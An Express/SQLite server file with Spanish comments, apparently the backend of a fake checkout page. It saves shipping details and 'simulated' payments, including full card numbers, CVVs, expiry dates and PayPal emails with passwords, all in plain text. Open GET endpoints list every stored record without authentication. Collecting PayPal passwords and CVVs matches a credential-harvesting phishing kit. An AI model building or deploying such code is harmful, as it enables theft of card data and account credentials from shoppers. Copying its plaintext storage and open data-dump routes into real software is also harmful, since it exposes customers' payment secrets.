// server.js
const express = require("express");
const path = require("path");
const sqlite3 = require("sqlite3").verbose();

const app = express();
// Usamos PORT de Render si existe, o 3000 en local
const PORT = process.env.PORT || 3000;

// ---------- MIDDLEWARE ----------
app.use(express.json());

// Carpeta donde están tus archivos HTML/CSS/JS
app.use(express.static(path.join(__dirname, "pdp")));

// ---------- BASE DE DATOS ----------
const db = new sqlite3.Database("mitienda.db");

db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS direcciones_envio (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      nombre    TEXT NOT NULL,
      calle     TEXT NOT NULL,
      colonia   TEXT NOT NULL,
      cp        TEXT NOT NULL,
      ciudad    TEXT NOT NULL,
      estado    TEXT NOT NULL,
      email     TEXT NOT NULL,
      telefono  TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS pagos (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      tipo TEXT NOT NULL,            -- 'card', 'paypal', 'cash'
      nombre_tarjeta TEXT,
      numero_tarjeta TEXT,
      vencimiento TEXT,
      cvv TEXT,
      paypal_email TEXT,
      paypal_pass TEXT,
      referencia_efectivo TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// ---------- RUTAS DE PÁGINAS ----------
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "pdp", "index.html"));
});

app.get("/oneCheckout.html", (req, res) => {
  console.log(
    "Enviando oneCheckout:",
    path.join(__dirname, "pdp", "oneCheckout.html")
  );
  res.sendFile(path.join(__dirname, "pdp", "oneCheckout.html"));
});

// Ruta de prueba opcional
app.get("/hola", (req, res) => {
  res.send("Hola desde Express 👍");
});

// ---------- API: GUARDAR DIRECCIÓN DE ENVÍO ----------
app.post("/api/direccion-envio", (req, res) => {
  const { nombre, calle, colonia, cp, ciudad, estado, email, telefono } =
    req.body;

  if (!nombre || !calle || !colonia || !cp || !ciudad || !estado || !email) {
    return res.status(400).json({ error: "Faltan campos obligatorios" });
  }

  const sql = `
    INSERT INTO direcciones_envio
      (nombre, calle, colonia, cp, ciudad, estado, email, telefono)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `;

  db.run(
    sql,
    [nombre, calle, colonia, cp, ciudad, estado, email, telefono || null],
    function (err) {
      if (err) {
        console.error("Error al insertar en BD:", err);
        return res
          .status(500)
          .json({ error: "Error al guardar en la base de datos" });
      }

      res.json({ ok: true, id: this.lastID });
    }
  );
});

// (OPCIONAL) endpoint para ver todas las direcciones
app.get("/api/direccion-envio", (req, res) => {
  db.all(
    "SELECT * FROM direcciones_envio ORDER BY created_at DESC",
    [],
    (err, rows) => {
      if (err) {
        console.error("Error al leer BD:", err);
        return res
          .status(500)
          .json({ error: "Error al leer la base de datos" });
      }
      res.json(rows);
    }
  );
});

// ---------- API: GUARDAR PAGO (SIMULADO) ----------
app.post("/api/pago", (req, res) => {
  const {
    tipo, // 'card', 'paypal' o 'cash'
    nombre_tarjeta,
    numero_tarjeta,
    vencimiento,
    cvv,
    paypal_email,
    paypal_pass,
    referencia_efectivo,
  } = req.body;

  if (!tipo) {
    return res.status(400).json({ error: "Falta el tipo de pago" });
  }

  const sql = `
    INSERT INTO pagos
      (tipo, nombre_tarjeta, numero_tarjeta, vencimiento, cvv, paypal_email, paypal_pass, referencia_efectivo)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `;

  db.run(
    sql,
    [
      tipo,
      nombre_tarjeta || null,
      numero_tarjeta || null,
      vencimiento || null,
      cvv || null,
      paypal_email || null,
      paypal_pass || null,
      referencia_efectivo || null,
    ],
    function (err) {
      if (err) {
        console.error("Error al guardar pago:", err);
        return res.status(500).json({ error: "Error al guardar pago" });
      }

      res.json({ ok: true, id: this.lastID });
    }
  );
});

// (Opcional) ver todos los pagos guardados
app.get("/api/pago", (req, res) => {
  db.all("SELECT * FROM pagos ORDER BY created_at DESC", [], (err, rows) => {
    if (err) {
      console.error("Error al leer pagos:", err);
      return res.status(500).json({ error: "Error al leer pagos" });
    }
    res.json(rows);
  });
});

// ---------- ARRANCAR SERVIDOR ----------
app.listen(PORT, () => {
  console.log(`Servidor en puerto ${PORT}`);
  console.log("Carpeta estática:", path.join(__dirname, "pdp"));
});
